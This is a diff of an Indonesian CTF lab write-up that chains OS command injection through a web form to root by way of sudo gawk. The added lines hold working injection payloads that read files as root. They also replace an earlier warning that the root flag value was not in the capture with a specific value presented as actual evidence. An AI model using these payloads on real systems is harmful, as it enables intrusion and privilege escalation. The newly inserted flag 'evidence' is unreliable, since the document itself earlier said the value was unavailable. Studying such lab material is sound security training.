@@ -1,4 +1,4 @@
-# 03 Write-Up Lab SIMON
+# 06 Write-Up Lab SIMON
 ## OS Command Injection → RCE `www-data` → User Flag → `sudo` NOPASSWD `gawk` → Root
 
 > **Khusus untuk ujian, laboratorium, CTF, atau pengujian keamanan yang telah memperoleh izin.**
@@ -55,8 +55,9 @@ WSL_IP_CAPTURE          = 172.26.59.55
 LPORT                   = 12345
 
 ROOT_SCOPE              = root pada container/aplikasi, verifikasi terhadap host
-ROOT_FLAG_PATH          = ditemukan dengan find setelah root
-ROOT_FLAG_VALUE         = tidak terlihat pada capture yang diberikan
+ROOT_FLAG_PATH          = /root/flag.txt
+ROOT_FLAG_VALUE         = FLAG{r00t_sud0_gawk_9a7d3c50}
+PRIMARY_ROOT_METHOD     = command root langsung melalui web
 ```
 
 ---
@@ -75,10 +76,11 @@ Host discovery 192.168.56.0/24
 → /home/monitor ditemukan
 → user flag dibaca dari /home/monitor/flag.txt
 → sudo -l mengungkap NOPASSWD /usr/bin/gawk
-→ gawk dijalankan melalui sudo sebagai root
-→ root shell diperoleh secara langsung atau melalui reverse shell
-→ cari root flag
-→ baca flag dari path yang ditemukan
+→ gawk dijalankan melalui sudo sebagai root langsung dari form web
+→ command `id` membuktikan `uid=0(root)`
+→ `find` dijalankan sebagai root melalui gawk
+→ `/root/flag.txt` ditemukan
+→ root flag dibaca langsung dari halaman web
 ```
 
 ---
@@ -159,7 +161,7 @@ Nmap host discovery
 | Sudo misconfiguration | `NOPASSWD: /usr/bin/gawk` |
 | Jalur privilege escalation | `sudo gawk` |
 | Scope root | Container/aplikasi; perlu verifikasi terhadap host |
-| Root flag | Cari setelah root; nilainya tidak terlihat pada capture |
+| Root flag | `/root/flag.txt` → `FLAG{r00t_sud0_gawk_9a7d3c50}` |
 
 ---
 
@@ -529,7 +531,7 @@ User flag membuktikan bahwa attacker telah memperoleh kemampuan command executio
 USER FLAG = FLAG{cmd_1nj3ct_subst_4b1c8f2e}
 ```
 
-> Capture SIMON memberikan nilai user flag secara jelas. Nilai root flag tidak terlihat pada halaman capture yang tersedia, sehingga tidak boleh direkayasa atau ditebak.
+> Capture tambahan membuktikan bahwa root flag berada di `/root/flag.txt` dan dapat dibaca langsung melalui fitur web setelah `gawk` dijalankan dengan `sudo`.
 
 ---
 
@@ -609,41 +611,29 @@ Opsi A lebih sederhana dan stabil. Opsi B mengikuti capture dan memberikan sesi 
 
 ---
 
-## 13. Fase 11A — Privilege Escalation Langsung Tanpa Reverse Shell
+## 13. Fase 11A — Privilege Escalation dan Pengambilan Flag Langsung melalui Web
 
-### 13.1 Validasi Command Root
+Metode ini menjadi **jalur utama** pada lab SIMON. Seluruh proses dilakukan melalui kolom **Alamat Target**, sehingga tidak membutuhkan listener, reverse shell, konfigurasi WSL `portproxy`, atau stabilisasi terminal.
 
-Masukkan ke kolom **Alamat Target**:
+### 13.1 Validasi Eksekusi sebagai Root
+
+Masukkan:
 
 ```text
 8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
 ```
 
-### Expected Output
+### Output Evidence Aktual
 
 ```text
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Apabila output tetap memuat UID `33`, periksa kembali rule `sudo -l` dan pastikan path binary sama persis:
+Output `uid=0(root)` membuktikan bahwa fungsi `system()` pada `gawk` dieksekusi dengan privilege root.
 
-```text
-/usr/bin/gawk
-```
+---
 
-### 13.2 Validasi Identitas
-
-```text
-8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("whoami")}'
-```
-
-Expected:
-
-```text
-root
-```
-
-### 13.3 Cari Root Flag Tanpa Shell Interaktif
+### 13.2 Menemukan Lokasi Flag melalui Web
 
 Masukkan:
 
@@ -651,38 +641,70 @@ Masukkan:
 8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
 ```
 
-Catat seluruh path yang muncul.
-
-Kemungkinan hasil dapat mencakup user flag:
+### Output Evidence Aktual
 
 ```text
 /home/monitor/flag.txt
+/root/flag.txt
 ```
 
-dan root flag pada lokasi yang hanya dapat dibaca root.
+| Jenis | Lokasi |
+|---|---|
+| User flag | `/home/monitor/flag.txt` |
+| Root flag | `/root/flag.txt` |
 
-### 13.4 Baca Flag dari Path yang Ditemukan
+---
 
-Contoh apabila hasil `find` menunjukkan `/root/flag.txt`:
+### 13.3 Membaca Kedua Flag Langsung melalui Web
+
+Masukkan:
+
+```text
+8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /home/monitor/flag.txt")}'; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}';
+```
+
+### Output Evidence Aktual
+
+```text
+FLAG{cmd_1nj3ct_subst_4b1c8f2e}
+FLAG{r00t_sud0_gawk_9a7d3c50}
+```
+
+### Hasil Final
+
+```text
+USER FLAG = FLAG{cmd_1nj3ct_subst_4b1c8f2e}
+ROOT FLAG = FLAG{r00t_sud0_gawk_9a7d3c50}
+```
+
+Alternatif membaca root flag saja:
 
 ```text
 8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
 ```
 
-Jangan menebak path. Gunakan hasil aktual dari command `find`.
+Expected:
 
-### Kelebihan Opsi A
+```text
+FLAG{r00t_sud0_gawk_9a7d3c50}
+```
 
-- tidak membutuhkan listener;
+### Keunggulan Metode Web Langsung
+
+- tidak membutuhkan listener Netcat;
 - tidak bergantung pada routing WSL;
-- mudah dibuktikan dari output aplikasi;
-- cocok untuk ujian dengan waktu terbatas.
+- tidak memerlukan Windows `portproxy`;
+- lebih cepat dan stabil untuk ujian;
+- seluruh evidence tampil pada halaman aplikasi;
+- sudah cukup untuk membuktikan root command execution dan memperoleh root flag.
+
+> Reverse shell tetap dapat digunakan untuk eksplorasi interaktif, tetapi tidak diperlukan untuk menyelesaikan lab.
 
 ---
 
-## 14. Fase 11B — Root Reverse Shell Menggunakan `gawk`
+## 14. Fase 11B — Alternatif Opsional: Root Reverse Shell Menggunakan `gawk`
 
-Opsi ini mengikuti alur pada capture SIMON.
+Opsi ini hanya diperlukan apabila ingin memperoleh shell interaktif. Untuk mendapatkan flag, metode web langsung pada Fase 11A sudah cukup dan lebih stabil.
 
 ### 14.1 Siapkan Listener
 
@@ -938,52 +960,58 @@ Untuk stabilitas ujian, Opsi A menggunakan `system()` sering lebih mudah daripad
 
 ---
 
-## 17. Fase 14 — Cari dan Baca Root Flag
+## 17. Fase 14 — Root Flag Diperoleh Langsung dari Web
 
-### Jangan Langsung Menebak Path
+Setelah `sudo gawk` terbukti menjalankan command sebagai root, pencarian dan pembacaan flag dilakukan sepenuhnya melalui form web.
 
-Setelah root diperoleh:
+### 17.1 Cari Lokasi Flag
 
-```bash
-find / -type f -name "flag.txt" 2>/dev/null
+```text
+8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
 ```
 
-Alternatif lebih luas:
-
-```bash
-find / -type f -iname "*flag*" 2>/dev/null
-```
-
-### Bedakan User Flag dan Root Flag
-
-User flag yang sudah diketahui:
+Output aktual:
 
 ```text
 /home/monitor/flag.txt
+/root/flag.txt
 ```
 
-Cari path lain yang hanya dapat diakses root.
-
-### Baca Flag
-
-```bash
-cat <PATH_ROOT_FLAG_DARI_FIND>
-```
-
-Contoh hanya apabila hasil `find` memang menunjukkan `/root/flag.txt`:
-
-```bash
-cat /root/flag.txt
-```
-
-### Output Final
+### 17.2 Baca Root Flag
 
 ```text
-root
-<ROOT_FLAG_DARI_TARGET>
+8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
 ```
 
-> Nilai root flag tidak terdapat pada capture `SIMON.pdf` yang diberikan. Dokumen ini sengaja tidak mengarang nilai flag. Isi bagian ini menggunakan output aktual target saat praktik.
+Output aktual:
+
+```text
+FLAG{r00t_sud0_gawk_9a7d3c50}
+```
+
+### 17.3 Baca User Flag dan Root Flag dalam Satu Request
+
+```text
+8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /home/monitor/flag.txt")}'; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}';
+```
+
+Output aktual:
+
+```text
+FLAG{cmd_1nj3ct_subst_4b1c8f2e}
+FLAG{r00t_sud0_gawk_9a7d3c50}
+```
+
+Rantai akhir dapat diringkas menjadi:
+
+```text
+command injection
+→ sudo gawk
+→ uid=0(root)
+→ find /root/flag.txt
+→ cat /root/flag.txt
+→ root flag
+```
 
 ---
 
@@ -1054,10 +1082,11 @@ Checklist keberhasilan:
 [ ] User flag terbaca
 [ ] sudo -l menunjukkan NOPASSWD /usr/bin/gawk
 [ ] gawk dapat menjalankan id sebagai root
-[ ] Root shell atau root command execution terkonfirmasi
+[ ] Root command execution melalui web terkonfirmasi dengan `uid=0(root)`
+[ ] `find` melalui `sudo gawk` menemukan `/root/flag.txt`
+[ ] Root flag terbaca langsung dari halaman web
+[ ] Root flag = `FLAG{r00t_sud0_gawk_9a7d3c50}`
 [ ] Scope container/host telah diverifikasi
-[ ] Root flag dicari menggunakan find
-[ ] Root flag dibaca dari path aktual
 ```
 
 ---
@@ -1632,7 +1661,7 @@ Tinjau:
 | Sudo enumeration | `NOPASSWD /usr/bin/gawk` |
 | Root proof | `id` menghasilkan UID 0 |
 | Container indicator | Hostname mirip container ID |
-| Root flag | Path dan isi aktual setelah `find` |
+| Root flag | `/root/flag.txt` dan `FLAG{r00t_sud0_gawk_9a7d3c50}` |
 
 ---
 
@@ -1652,16 +1681,18 @@ shell. Salah konfigurasi tersebut memungkinkan privilege escalation dari www-dat
 menjadi root pada lingkungan container aplikasi.
 
 Rantai kerentanan memungkinkan attacker menjalankan command arbitrer, membaca data
-user lokal, memperoleh user flag, mengambil alih container sebagai root, dan membaca
-data yang hanya tersedia bagi root. Ruang lingkup terhadap host harus diverifikasi
-terpisah karena hostname target mengindikasikan lingkungan container.
+user lokal, memperoleh user flag, dan menjalankan command sebagai root langsung dari
+form web. Melalui `sudo gawk`, penguji menemukan `/root/flag.txt` dan membaca
+`FLAG{r00t_sud0_gawk_9a7d3c50}` tanpa membutuhkan reverse shell. Ruang lingkup terhadap
+host tetap harus diverifikasi terpisah karena hostname target mengindikasikan
+lingkungan container.
 ```
 
 ---
 
 # Bagian C — Close Book dan Cheat Sheet
 
-> Gunakan bagian ini setelah memahami Bagian A. Nilai root flag harus diambil dari target aktual karena tidak terlihat pada capture.
+> Gunakan bagian ini setelah memahami Bagian A. Jalur tercepat adalah menjalankan `gawk system()` langsung melalui form web sampai root flag tampil.
 
 ---
 
@@ -1758,7 +1789,7 @@ Expected:
 
 ---
 
-## 6. Opsi Cepat — Root Command Langsung
+## 6. Opsi Utama — Root dan Flag Langsung melalui Web
 
 ```text
 8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
@@ -1779,12 +1810,18 @@ Cari flag:
 Baca path yang ditemukan:
 
 ```text
-8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /PATH/ROOT/FLAG")}'
+8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
+```
+
+Expected:
+
+```text
+FLAG{r00t_sud0_gawk_9a7d3c50}
 ```
 
 ---
 
-## 7. Opsi Capture — Root Reverse Shell
+## 7. Opsi Tambahan — Root Reverse Shell
 
 ### PowerShell Administrator untuk WSL
 
@@ -1857,7 +1894,7 @@ http://192.168.56.12:8347/monitor/
 8.8.8.8; sudo -l
 8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
 8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
-8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /PATH/ROOT/FLAG")}'
+8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
 ```
 
 ---
@@ -1872,10 +1909,10 @@ SCAN
 → WWW-DATA
 → USER FLAG
 → SUDO -L
-→ GAWK
-→ ROOT
-→ FIND FLAG
-→ CAT FLAG
+→ GAWK VIA WEB
+→ UID 0
+→ FIND /root/flag.txt
+→ CAT ROOT FLAG
 ```
 
 ## Mnemonic
